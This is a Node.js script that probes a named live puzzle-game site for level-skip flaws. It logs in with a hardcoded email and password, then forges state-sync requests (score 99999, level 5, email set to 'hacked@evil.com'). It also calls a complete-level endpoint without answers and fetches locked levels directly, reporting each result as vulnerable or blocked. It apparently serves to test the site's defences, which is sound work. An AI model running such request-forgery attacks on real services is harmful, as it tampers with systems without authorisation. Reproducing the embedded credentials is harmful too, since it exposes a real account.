#!/usr/bin/env node
/** Attempt level-skip exploits (sync forge, direct URLs, complete-level). */
const BASE = process.env.TARGET || "https://crypt-hunt-seven.vercel.app";
const EMAIL = process.env.EMAIL || "sr970@snu.edu.in";
const PASS = process.env.PASS || "Password@1234";

function cookies(res) {
  const raw = res.headers.getSetCookie?.() ?? [];
  return raw.map((c) => c.split(";")[0]).join("; ");
}

async function login() {
  const res = await fetch(`${BASE}/api/auth/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: EMAIL, password: PASS }),
  });
  const json = await res.json();
  const jar = cookies(res);
  if (!jar) throw new Error(`Login failed: ${res.status} ${JSON.stringify(json)}`);
  return { jar, user: json.user };
}

async function req(method, path, jar, body) {
  const res = await fetch(`${BASE}${path}`, {
    method,
    headers: { "Content-Type": "application/json", Cookie: jar },
    body: body !== undefined ? JSON.stringify(body) : undefined,
  });
  let json = null;
  try { json = await res.json(); } catch { /* */ }
  return { status: res.status, json };
}

async function main() {
  console.log(`\n=== Level skip exploit probe: ${BASE} ===\n`);
  const { jar, user: before } = await login();
  console.log("Before:", `L${before.currentLevel} Q${before.currentQuestion} score=${before.score}\n`);

  const attacks = [
    {
      name: "POST /api/auth/sync — forge currentLevel to 5",
      run: () => req("POST", "/api/auth/sync", jar, { currentLevel: 5, score: 99999, currentQuestion: 1, elapsedTime: 1 }),
    },
    {
      name: "POST /api/auth/sync — forge level + elapsedTime only",
      run: () => req("POST", "/api/auth/sync", jar, { elapsedTime: 2, currentLevel: 5 }),
    },
    {
      name: "POST /api/auth/sync — old-style full state dump",
      run: () =>
        req("POST", "/api/auth/sync", jar, {
          score: 99999,
          currentLevel: 5,
          currentQuestion: 6,
          elapsedTime: 100,
          levelCompletePending: true,
          email: "hacked@evil.com",
        }),
    },
    {
      name: "POST /api/game/complete-level (skip all questions)",
      run: () => req("POST", "/api/game/complete-level", jar, {}),
    },
    {
      name: "GET /api/game/question?levelId=5 (jump to Candle Cove)",
      run: () => req("GET", "/api/game/question?levelId=5", jar),
    },
    {
      name: "GET /api/game/question?levelId=3 (jump to Ben)",
      run: () => req("GET", "/api/game/question?levelId=3", jar),
    },
  ];

  for (const a of attacks) {
    const r = await a.run();
    console.log(`${a.name}`);
    console.log(`  → HTTP ${r.status}`, JSON.stringify(r.json)?.slice(0, 120));
  }

  const me = await req("GET", "/api/auth/me", jar);
  const after = me.json?.user;
  console.log("\nAfter attacks:", `L${after?.currentLevel} Q${after?.currentQuestion} score=${after?.score}`);

  const levelChanged = after?.currentLevel !== before.currentLevel;
  const scoreChanged = after?.score !== before.score;
  const questionChanged = after?.currentQuestion !== before.currentQuestion;

  console.log("\n--- Verdict ---");
  console.log(`Level changed: ${levelChanged ? "YES — VULNERABLE" : "NO — blocked"}`);
  console.log(`Score changed: ${scoreChanged ? "YES — VULNERABLE" : "NO — blocked"}`);
  console.log(`Question changed: ${questionChanged ? "YES — VULNERABLE" : "NO — blocked"}`);

  // Direct URL load (HTML) — frontend-only gate
  const pages = ["/level/ben", "/level/candlecove", "/level/puppeteer"];
  console.log("\n--- Direct level URL fetch (frontend pages) ---");
  for (const p of pages) {
    const r = await fetch(`${BASE}${p}`, { headers: { Cookie: jar, Accept: "text/html" } });
    const html = await r.text();
    const hasEnter = html.includes("ENTER ANSWER") || html.includes("answer") || html.includes("cipher");
    console.log(`${p} → HTTP ${r.status}, page loads HTML: ${html.length > 5000}, looks like playable: ${hasEnter}`);
  }

  // Can we submit on wrong level via API if we knew answers?
  if (before.currentLevel <= 5 && !before.completedAt) {
    const sub = await req("POST", "/api/game/submit", jar, { answer: "test_skip_probe" });
    console.log(`\nSubmit on current level: HTTP ${sub.status}`, JSON.stringify(sub.json));
  }

  console.log();
}

main().catch((e) => { console.error(e); process.exit(1); });
